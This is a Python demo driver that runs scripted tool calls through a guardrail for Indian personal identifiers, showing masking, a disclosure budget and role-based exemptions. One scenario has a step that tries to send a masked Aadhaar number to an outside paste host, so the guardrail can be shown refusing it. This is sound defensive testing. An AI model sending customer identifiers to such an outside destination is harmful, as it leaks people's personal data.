"""Scripted demo driver — the same guardrail, without the model.

Why this exists: the agent loop needs Bedrock to decide which tools to
call, and Bedrock is gated on this account pending AWS's new-account
verification (see `GET /diag`, which probes it live). The *guardrail* needs
no model at all — Cedar, the disclosure ledger, redaction, placeholder
minting and rehydration are deterministic — so a fixed call sequence
exercises the identical decision path and writes identical audit rows.

What is real in a scripted run, and what is not:

  REAL  the tool results (the same fixtures the agent would fetch)
  REAL  Q1 authorization, via the same Cedar policy text
  REAL  tier-1 detection: Verhoeff-validated Aadhaar, PAN/GSTIN/IFSC/voter
        formats, all computed locally with no AWS dependency
  REAL  Q2 per-field authorization against the live DynamoDB ledger
  REAL  redaction, placeholder minting, the vault, Q3 rehydration
  REAL  every audit row written to DynamoDB

  NOT   the agent's choice of which tool to call next, which is scripted
  NOT   tier 2 (Comprehend) and tier 3 (Nova) detection breadth, because
        those services are gated — every row says so in `tiers_unavailable`

That last point is the whole reason this is honest rather than a mock: a
scripted run cannot silently look like a full one. The narrower scan is
recorded on the row and rendered in the UI.
"""

from __future__ import annotations

import attribute
import audit
import cedar_q2
import ledger as ledger_mod
import tools
from config import CFG
from guard import DisclosureGuard
from rehydrate import Rehydrator, Vault

# Each step is (tool_name, kwargs). The sequences come from the demo
# fixtures, and each one exists to prove a specific claim.
SCENARIOS: dict[str, dict] = {
    "benign": {
        "title": "Benign lookup",
        "proves": "Aadhaar and PAN are masked, the name is released, the ledger records what was spent.",
        "steps": [("fetch_customer", {"customer_id": "cust_8814", "field": "kyc"})],
    },
    "budget": {
        "title": "Budget bites",
        "proves": "The fourth distinct identifying field for one subject is refused, because the first three already spent the budget.",
        # Deliberately PAN / GSTIN / IFSC / voter ID rather than
        # name / phone / email / address: those four are Comprehend types,
        # and Comprehend is gated on this account, so a scripted run would
        # detect nothing and the budget would never bite. These four are all
        # tier-1 — validated locally, no AWS dependency — so the beat is
        # real rather than staged.
        "steps": [
            ("fetch_customer", {"customer_id": "cust_8814", "field": "kyc"}),
            ("fetch_customer", {"customer_id": "cust_8814", "field": "tax"}),
            ("fetch_customer", {"customer_id": "cust_8814", "field": "bank"}),
            ("fetch_customer", {"customer_id": "cust_8814", "field": "voter"}),
        ],
    },
    "exfiltration": {
        "title": "Exfiltration attempt",
        "proves": "Restoring a masked value into an unauthorized destination is refused at Q3 — the guardrail is not an exfiltration channel.",
        "steps": [
            ("fetch_customer", {"customer_id": "cust_8814", "field": "kyc"}),
            ("send_summary", {"to": "pastebin.example.com", "body": "customer id {IN_AADHAAR}"}),
        ],
    },
    "compliance": {
        "title": "Compliance role",
        "proves": "The same call under a principal the policy exempts returns the fields an analyst cannot see.",
        "steps": [("fetch_customer", {"customer_id": "cust_8814", "field": "kyc"})],
    },
}


class _State:
    """Minimal stand-in for agent.state. The guard caches the ledger here;
    with no Agent there is nothing to sync it to, and DynamoDB is the
    authority regardless, so an in-memory dict is the whole contract."""

    def __init__(self) -> None:
        self._d: dict = {}

    def set(self, k, v):
        self._d[k] = v

    def get(self, k):
        return self._d.get(k)


class _Agent:
    def __init__(self) -> None:
        self.state = _State()


class _Event:
    """Stands in for Before/AfterToolCallEvent. The guard and the rehydrator
    only ever touch .tool_use, .result and .agent."""

    def __init__(self, tool_use: dict, result=None, agent=None):
        self.tool_use = tool_use
        self.result = result
        self.agent = agent or _Agent()
        self.cancel_tool = None


def _tool_by_name(name: str):
    for fn in tools.TOOL_FUNCTIONS:
        if getattr(fn, "tool_name", None) == name or getattr(fn, "__name__", None) == name:
            return fn
    raise KeyError(name)


def run_scenario(
    scenario: str,
    *,
    session_id: str,
    principal: str,
    role: str,
    policy_bundle,
    ledger: ledger_mod.Ledger,
    invocation_id: str,
) -> dict:
    spec = SCENARIOS[scenario]
    vault = Vault()

    guard = DisclosureGuard(
        session_id=session_id,
        principal=principal,
        role=role,
        vault=vault,
        ledger=ledger,
        policy=policy_bundle,
        cfg=CFG,
        # Tier 2/3 are gated on this account. Run the tiers that CAN run and
        # record the ones that could not, rather than withholding every
        # payload and demonstrating nothing.
        degraded_ok=True,
    )
    rehydrator = Rehydrator(vault=vault, principal=principal, role=role, policy=policy_bundle)
    hook = audit.AuditHook(
        session_id=session_id,
        principal=principal,
        role=role,
        invocation_id=invocation_id,
        guard=guard,
        policy=policy_bundle,
        cfg=CFG,
        rehydrator=rehydrator,
    )

    agent = _Agent()
    transcript: list[dict] = []

    try:
        for i, (tool_name, kwargs) in enumerate(spec["steps"], start=1):
            tool_use_id = f"demo-{scenario}-{i}"

            # A step may reference a placeholder minted by an earlier step —
            # "{IN_AADHAAR}" is resolved to whatever token the vault actually
            # issued, so the exfiltration scenario carries a real placeholder
            # rather than a hand-written string that Q3 would reject for the
            # wrong reason.
            resolved_kwargs = {}
            for k, v in kwargs.items():
                if isinstance(v, str) and "{IN_AADHAAR}" in v:
                    token = next((t for t in vault.tokens() if t.startswith("[IN_AADHAAR")), "[IN_AADHAAR_1_0000]")
                    v = v.replace("{IN_AADHAAR}", token)
                resolved_kwargs[k] = v

            tool_use = {"name": tool_name, "input": resolved_kwargs, "toolUseId": tool_use_id}

            # Q1 + the session-ceiling backstop.
            before_ev = _Event(tool_use, agent=agent)
            decision = guard.before_tool_call(before_ev)
            if type(decision).__name__ == "Deny":
                before_ev.cancel_tool = f"DENIED: {decision.reason}"
                hook._on_before_tool_call(before_ev)
                transcript.append({"step": i, "tool": tool_name, "outcome": "denied_call", "reason": decision.reason})
                continue

            # Q3 — rehydration into this call's destination.
            rehydrate_decision = rehydrator.before_tool_call(before_ev)
            if type(rehydrate_decision).__name__ == "Deny":
                before_ev.cancel_tool = f"DENIED: {rehydrate_decision.reason}"
                hook._on_before_tool_call(before_ev)
                transcript.append(
                    {"step": i, "tool": tool_name, "outcome": "denied_placeholder", "reason": rehydrate_decision.reason}
                )
                continue

            result = _tool_by_name(tool_name)(**before_ev.tool_use["input"])

            after_ev = _Event(before_ev.tool_use, result=result, agent=agent)
            outcome = guard.after_tool_call(after_ev)
            if getattr(outcome, "apply", None) is not None:
                outcome.apply(after_ev)
            hook._on_after_tool_call(after_ev)

            hop = next((r for r in hook.rows if r.seq == len(hook.rows)), None)
            content = after_ev.result.get("content") or [{}]
            text = content[0].get("text") or ""
            transcript.append(
                {
                    "step": i,
                    "tool": tool_name,
                    "outcome": hop.outcome if hop else "ok",
                    "released": text[:400],
                    "entities_found": hop.entities_found if hop else {},
                    "entities_masked": hop.entities_masked if hop else {},
                    "entities_revealed": hop.entities_revealed if hop else {},
                    "ledger_after": hop.ledger_after if hop else [],
                    "tiers_unavailable": hop.tiers_unavailable if hop else [],
                }
            )
    finally:
        # The vault is invocation-scoped and holds plaintext. It never
        # outlives this call, on any path.
        vault.clear()

    return {
        "scenario": scenario,
        "title": spec["title"],
        "proves": spec["proves"],
        "scripted": True,
        "transcript": transcript,
        "rows": len(hook.rows),
    }
